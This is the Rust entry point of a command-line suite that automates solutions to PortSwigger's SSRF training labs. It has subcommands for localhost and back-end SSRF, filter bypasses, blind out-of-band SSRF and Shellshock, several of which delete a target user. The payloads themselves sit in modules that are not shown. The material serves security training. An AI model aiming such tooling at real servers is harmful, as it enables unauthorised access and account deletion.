use clap::{command, arg, Command};

mod misc;
mod ssrf_0x01;
mod ssrf_0x02;
mod ssrf_0x03;
mod ssrf_0x04;
mod ssrf_0x05;
mod ssrf_0x06;
mod ssrf_0x07;

use misc::{about, lets_go, did_i_win};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let banner = r#"
                          + --------------------------------------------- +
    \\/),               / | Scripts suite for PortSwigger's labs on SSRF. |
   ,'.' /,             +  | bY: cbr4l0k from Spyz.                        |
  (_)- / /,            |  + --------------------------------------------- +
     /\_/ |__..--,  *  | /                                               /
    (\ _ /\ \ \ / ).'   + --------------------------------------------- +
     \(-'./ / (_ //
      \\ \,'--'\_(
      )(_/  )_/ )_)
     (_,'  (_.'(_.'"#;

    let matches = command!("PortSwigger's SSRF Suite") 
        .author("cbr4l0k from SpyZ")
        .about(banner)
        .propagate_version(true)
        .subcommand_required(true)
        .arg_required_else_help(true)
        .subcommand(
            Command::new("0x01")
            .arg_required_else_help(true)
            .about(about("Basic SSRF against the local server.","ssrf/lab-basic-ssrf-against-localhost", "cbr4l0k from Spyz"))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-t --target_username <TARGET_USERNAME> "")
                .required(true)
                .help("The target user will be deleted from the system.")
            )
        )
        .subcommand(
            Command::new("0x02")
            .arg_required_else_help(true)
            .about(about("Basic SSRF against another back-end system.","ssrf/lab-basic-ssrf-against-backend-system", "cbr4l0k from Spyz"))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-t --target_username <TARGET_USERNAME> "")
                .required(true)
                .help("The target user will be deleted from the system.")
            )
            .arg(arg!(-T --threads <THREADS> "")
                .default_value("8")
                .help("Number of threads used while finding the target url.")
            )
        )
        .subcommand(
            Command::new("0x03")
            .arg_required_else_help(true)
            .about(about("Blind SSRF with out-of-band detection.","ssrf/blind/lab-out-of-band-detection", "cbr4l0k from Spyz"))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-c --collaborator_payload <BURPSUITS_COLLABORATOR_PAYLOAD> "")
                .required(true)
                .help("Payload generated on BurpSuite's collaborator (only works in pro version).")
            )
        )
        .subcommand(
            Command::new("0x04")
            .arg_required_else_help(true)
            .about(about("SSRF with blacklist-based input filter.","ssrf/lab-ssrf-with-blacklist-filter", "cbr4l0k from Spyz"))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-t --target_username <TARGET_USERNAME> "")
                .required(true)
                .help("The target user will be deleted from the system.")
            )
        )
        .subcommand(
            Command::new("0x05")
            .arg_required_else_help(true)
            .about(about("SSRF with filter bypass via open redirection vulnerability.","ssrf/lab-ssrf-filter-bypass-via-open-redirection", "cbr4l0k from Spyz"))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-t --target_username <TARGET_USERNAME> "")
                .required(true)
                .help("The target user will be deleted from the system.")
            )
        )
        .subcommand(
            Command::new("0x06")
            .arg_required_else_help(true)
            .about(about("Blind SSRF with Shellshock exploitation.","ssrf/blind/lab-shellshock-exploitation", ""))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-c --collaborator_payload <BURPSUITS_COLLABORATOR_PAYLOAD> "")
                .required(true)
                .help("Payload generated on BurpSuite's collaborator (only works in pro version).")
            )
            .arg(arg!(-T --threads <THREADS> "")
                .default_value("8")
                .help("Number of threads used while finding the target url.")
            )
        )
        .subcommand(
            Command::new("0x07")
            .arg_required_else_help(true)
            .about(about("SSRF with whitelist-based input filter.","ssrf/lab-ssrf-with-whitelist-filter", ""))
            .arg(arg!(-u --url <PORTSWIGGER_LAB_URL> "")
                .required(true)
                .help("Homepage of the targeted lab.")
            )
            .arg(arg!(-t --target_username <TARGET_USERNAME> "")
                .required(true)
                .help("The target user will be deleted from the system.")
            )
        )
        .get_matches();

    if let Some(matches) = matches.subcommand_matches("0x01") {
        if matches.contains_id("url") && matches.contains_id("target_username") {
            let url = matches.get_one::<String>("url").unwrap();
            let target_username = matches.get_one::<String>("target_username").unwrap();

            lets_go("0x01");
            let _ = ssrf_0x01::delete_user(url, target_username).await?;
            let _ = did_i_win(url, "0x01").await;
        }
    } else if let Some(matches) = matches.subcommand_matches("0x02") {
        if matches.contains_id("url") && matches.contains_id("target_username") {
            let url = matches.get_one::<String>("url").unwrap();
            let target_username = matches.get_one::<String>("target_username").unwrap();
            let threads = matches.get_one::<String>("threads").unwrap().parse::<usize>().unwrap();

            lets_go("0x02");
            let _ = ssrf_0x02::find_and_delete(url.as_str(), target_username.as_str(), threads).await;
            let _ = did_i_win(url, "0x02").await;
        }
    } else if let Some(matches) = matches.subcommand_matches("0x03") {
        if matches.contains_id("url") && matches.contains_id("collaborator_payload") {
            let url = matches.get_one::<String>("url").unwrap();
            let cp = matches.get_one::<String>("collaborator_payload").unwrap();
            let collaborator = format!("http://{cp}");

            lets_go("0x03");
            let _ = ssrf_0x03::lookup(url, collaborator.as_str()).await;
            let _ = did_i_win(url, "0x03").await;
        }
    } else if let Some(matches) = matches.subcommand_matches("0x04") {
        if matches.contains_id("url") && matches.contains_id("target_username") {
            let url = matches.get_one::<String>("url").unwrap();
            let target_username = matches.get_one::<String>("target_username").unwrap();

            lets_go("0x04");
            let _ = ssrf_0x04::delete_user(url, target_username).await?;
            let _ = did_i_win(url, "0x04").await;
        }
    } else if let Some(matches) = matches.subcommand_matches("0x05") {
        if matches.contains_id("url") && matches.contains_id("target_username") {
            let url = matches.get_one::<String>("url").unwrap();
            let target_username = matches.get_one::<String>("target_username").unwrap();

            lets_go("0x05");
            let _ = ssrf_0x05::delete_user(url, target_username).await?;
            let _ = did_i_win(url, "0x05").await;
        }
    } else if let Some(matches) = matches.subcommand_matches("0x06") {
        if matches.contains_id("url") && matches.contains_id("collaborator_payload") {
            let url = matches.get_one::<String>("url").unwrap();
            let cp = matches.get_one::<String>("collaborator_payload").unwrap();
            let threads = matches.get_one::<String>("threads").unwrap().parse::<usize>().unwrap();

            lets_go("0x06");
            let _ = ssrf_0x06::lookup(url.as_str(), cp.as_str(), threads).await;
            let _ = ssrf_0x06::submit_solution(url.as_str()).await;
            let _ = did_i_win(url, "0x06").await;
        }
    } else if let Some(matches) = matches.subcommand_matches("0x07") {
        if matches.contains_id("url") && matches.contains_id("target_username") {
            let url = matches.get_one::<String>("url").unwrap();
            let target_username = matches.get_one::<String>("target_username").unwrap();

            lets_go("0x07");
            let _ = ssrf_0x07::delete_user(url, target_username).await?;
            let _ = did_i_win(url, "0x07").await;
        }
    }

    Ok(())
}
